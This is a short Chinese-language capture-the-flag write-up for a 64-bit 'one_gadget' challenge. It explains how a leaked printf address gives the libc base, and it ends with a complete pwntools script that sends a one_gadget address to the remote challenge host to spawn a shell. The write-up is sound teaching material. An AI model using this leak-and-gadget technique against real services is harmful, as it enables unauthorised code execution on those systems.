程序是64位的，首先checksec

![image-20201101141818205](https://static.hack1s.fun/images/2021/02/06/image-20201101141818205.png)

运行一下之后首先有一个说`here is a gift for u`

这里直接输出了printf的地址，拿这个地址可以去查到libc的基地址和版本

![image-20201101142701814](https://static.hack1s.fun/images/2021/02/06/image-20201101142701814.png)



之后要求输入一个`gadget`

![image-20201101142126563](https://static.hack1s.fun/images/2021/02/06/image-20201101142126563.png)

在程序的函数中可以看到

![image-20201101142037053](https://static.hack1s.fun/images/2021/02/06/image-20201101142037053.png)

直接就是跳到了这个gadget的位置

那么思路就是，通过printf的地址计算出libc的基地址；

之后用one_gadget搜索其中的system或execve，直接把gadget输入给程序

![image-20201102162750820](https://static.hack1s.fun/images/2021/02/06/image-20201102162750820.png)

测试后最后一个gadget是可以正常执行的

```python
from pwn import *

io = remote('node3.buuoj.cn',26587)
#io = process('./one_gadget')
libc = ELF('./libc-2.29.so')

printf_offset = libc.sym['printf']

io.recvuntil(' u:')

printf_addr = int(io.recvline()[:-1],16)

libc_base = printf_addr - printf_offset
gadget = 0x106ef8

io.sendline(str(libc_base+gadget)+'\n')
io.interactive()
```

